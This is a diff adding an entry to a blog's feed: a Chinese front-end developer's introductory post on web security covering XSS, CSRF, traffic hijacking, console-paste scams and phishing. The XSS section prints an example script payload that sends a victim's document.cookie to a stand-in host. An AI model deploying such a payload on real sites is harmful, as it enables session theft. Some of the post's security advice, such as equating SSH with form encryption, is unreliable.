@@ -50,6 +50,39 @@
   </entry>
   
   <entry>
+    <title>浅谈网络安全</title>
+    <link href="http://yoursite.com/2017/02/10/web%E5%AE%89%E5%85%A8%E6%B5%85%E8%B0%88/"/>
+    <id>http://yoursite.com/2017/02/10/web安全浅谈/</id>
+    <published>2017-02-10T13:33:22.000Z</published>
+    <updated>2017-07-18T13:36:41.303Z</updated>
+    
+    <content type="html"><![CDATA[<p>​           大学的时候方向偏网络，考了ccna，并且准备往ie发展的时候，一次偶然的机会微软培训机会让我接触了前端。虽然从事前端行业时间不算很长，但是，，额，还是来聊聊安全吧 ，没有但是#-#</p>
+<a id="more"></a>
+<h3 id="1-XXX跨站脚本攻击"><a href="#1-XXX跨站脚本攻击" class="headerlink" title="1.XXX跨站脚本攻击"></a>1.XXX跨站脚本攻击</h3><p>个人感觉这种理解起来简直通俗易懂，可以通过script，img的src，url地址栏等可以发送请求的地方发送 一段可以执行的代码达到攻击者（都不想说这是黑客，我心目中的黑客应该是叼叼的）的目的。</p>
+<pre><code>举个简单的例子：让别人人点击这个地址，通过qq群，垃圾邮件等等手段
+</code></pre><p>abc.com/search?name=<script>document.location=’<a href="http://abc/get?cookie=&#39;+document.cookie">http://abc/get?cookie=&#39;+document.cookie</a></script></p>
+<p>这样就可以获取别人的cookie信息了<br>所以写页面的时候要注意这些，规避这些。<br>1.页面上不要有表单元素能解析html的，记得全都解析成字符串<br>2.能从url获取的信息的，建议由后台获取，前端转义再输出比较好</p>
+<h3 id="2-CSRF攻击"><a href="#2-CSRF攻击" class="headerlink" title="2.CSRF攻击"></a>2.CSRF攻击</h3><p>  CSRF（Cross-site request forgery跨站请求伪造）<br>   其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。<br>具体的代码就不附了，知道意思就行了。</p>
+<h3 id="3-网络劫持攻击"><a href="#3-网络劫持攻击" class="headerlink" title="3.网络劫持攻击"></a>3.网络劫持攻击</h3><p>  这种是你的数据传送的过程被劫持了嘛，比如连不安全的wifi，或者数据经过某条被不法分子监听的链路被劫持。这种最好的方法是https进行加密，ssl协议没大毛病，不过要钱，散户就别去整了，除非你的站点是特别有价值的。<br>   其实做表单提交的时候 只要做非对称加密就可以了，ssh嘛，也没毛病，数据劫持了也没关系，坏人们解析不了。</p>
+<h3 id="4-控制台注入代码"><a href="#4-控制台注入代码" class="headerlink" title="4.控制台注入代码"></a>4.控制台注入代码</h3><p>   有的黑客会诱骗用户去往控制台里面粘贴东西（欺负小白用户不懂代码），比如可以在朋友圈贴个什么文章，说:”只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品”之类的。<br>   我只能说  别闹，不过已经在看这篇文章的伙计，这点小把戏肯定毛不过你们嘛。</p>
+<h3 id="5-钓鱼"><a href="#5-钓鱼" class="headerlink" title="5.钓鱼"></a>5.钓鱼</h3><p>   就是拿个鱼竿去钓鱼，开玩笑。这种攻击都算不上是前端方面的。<br>   就是做一个很逼真的假网站，不过现在稍微安装个杀毒的，都会提示这个网站不安全，不要乱登陆一些qq弹框，那只是像而已。要注意辨别。</p>
+<p>网络安全对于前端，个人浅见，只要涉及到个人信息隐私账户密码，能跟后端的做数据交互的地方都要慎之又慎，当然我们可能不会做到完美，至少可以防范一些 每天都在网络上爬呀爬的脚本。有点像废话..哈</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;​           大学的时候方向偏网络，考了ccna，并且准备往ie发展的时候，一次偶然的机会微软培训机会让我接触了前端。虽然从事前端行业时间不算很长，但是，，额，还是来聊聊安全吧 ，没有但是#-#&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
+    
+    
+      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>xTemplate模板实例参考</title>
     <link href="http://yoursite.com/2016/09/18/xTemplate%E6%A8%A1%E6%9D%BF%E8%AF%AD%E5%8F%A5%E5%8F%82%E8%80%83/"/>
     <id>http://yoursite.com/2016/09/18/xTemplate模板语句参考/</id>
